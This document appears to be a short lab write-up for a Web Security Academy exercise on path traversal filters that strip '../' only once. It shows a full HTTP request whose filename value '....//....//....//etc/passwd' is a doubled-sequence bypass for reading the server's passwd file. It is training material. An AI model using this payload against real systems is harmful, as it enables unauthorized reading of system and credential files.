### Lab: File path traversal, traversal sequences stripped non-recursively

---

双写绕过

```(空)
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: 0a4d00b904779d0d81193fa7001e002b.web-security-academy.net
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate, br, zstd
Cookie: session=WksCtkBKHRodMwy2hUqfjQGRRda8eZs9
Connection: keep-alive
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: image
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Sec-Fetch-Mode: no-cors
sec-ch-ua-platform: "Windows"
Referer: https://0a4d00b904779d0d81193fa7001e002b.web-security-academy.net/
```



![image-20241217153742295](https://gitee.com/bx33661/image/raw/master/path/image-20241217153742295.png)